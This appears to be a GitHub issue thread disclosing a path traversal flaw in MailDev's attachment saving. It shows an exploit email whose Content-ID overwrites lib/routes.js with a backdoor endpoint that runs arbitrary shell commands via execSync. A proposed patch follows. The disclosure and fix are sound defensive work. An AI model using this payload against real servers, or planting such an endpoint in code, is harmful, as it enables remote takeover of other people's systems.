| We (The organizing members of the international cybersecurity competition CODEGATE - <https://codegate2023.org/>) have found a vulnerability that could possibly overwrite any files by sending a malicious e-mail to port 1025.  This vulnerability could possibly force-write existing sourcecodes and could completely takeover the server. Explanation    [maildev/lib/mailserver.js](https://github.com/maildev/maildev/blob/357a20edcd205413d3590aedb8fcd7c97563c40d/lib/mailserver.js#L92-L100)  Lines 92 to 100 in [357a20e](/maildev/maildev/commit/357a20edcd205413d3590aedb8fcd7c97563c40d)   |  | function saveAttachment (id, attachment) { | | --- | --- | |  | if (!fs.existsSync(path.join(mailServer.mailDir, id))) { | |  | fs.mkdirSync(path.join(mailServer.mailDir, id)) | |  | } | |  | const output = fs.createWriteStream( | |  | path.join(mailServer.mailDir, id, attachment.contentId) | |  | ) | |  | attachment.stream.pipe(output) | |  | } |      There is no path sanitization done when files are sent with a malicious `contentId`. This means, it is possible to do a path traversal to access the parent directory and overwrite any files.  For example, when a mail with the following content is sent to a server in port 1025, `lib/routes.js` will be overwritten and the malicious code will start to be affected from next restart of the process. There is no user interaction required to achieve this attack.  The following mail content was tested on the latest Docker instance (`soulteary/maildev:latest`) and was found to be exploitable.  ``` ... --mixed-content-malicious Content-Type: image/png; charset=UTF-8; filename="a.png" Content-ID: <../../../home/node/lib/routes.js> Content-Transfer-Encoding: base64 Content-Disposition: inline  ... ( some malicious base64 content ) ...  --mixed-content-malicious--  ```  content of the encoded base64 content  ``` /**  * MailDev - routes.js  */ const express = require('express') const compression = require('compression') const pkg = require('../package.json') const { filterEmails } = require('./utils') ...   // Health check   router.get('/healthz', function (req, res) {     res.json(true)   })    // Malicious Endpoint   router.get('/malicious_command_running_endpoint', function(req, res) {     res.json(require("child_process").execSync(req.query.cmd).toString())   }) ... ...  ``` |

| The exploit gist is here as for the reference: <https://gist.github.com/stypr/fe2003f00959f7e3d92ab9d5260433f8> There is a way to force-crash (DoS) the instance so that the backdoor is loaded upon the restart of the process. I didn't add that on it. |

| [@mtrefzer](https://github.com/mtrefzer)  The maintainer has been away for more than a year, so you probably have to fix the code on your own.  The patch suggested at [#487](https://github.com/maildev/maildev/pull/487) looks good to me as for a temporary fix, but there is a high chance of vulnerability to reoccur when vendor packages are updated to newer version.  My suggested fix would be to just replace the path traversal patterns to some other typical character on `attachment.contentId`.  Something like the following code should possibly prevent from arbitrary file write. Feel free to add modifications and make PR out of it. (`maildev/lib/mailserver.js`)  ```  function saveAttachment (id, attachment) {     if (!fs.existsSync(path.join(mailServer.mailDir, id))) {       fs.mkdirSync(path.join(mailServer.mailDir, id))     }     const output = fs.createWriteStream(       path.join(mailServer.mailDir, id.replace(/(\.\.|:|\/|\\)+/g, '-'), attachment.contentId.replace(/(\.\.|:|\/|\\)+/g, '-'))     )     attachment.stream.pipe(output)   }  ``` |
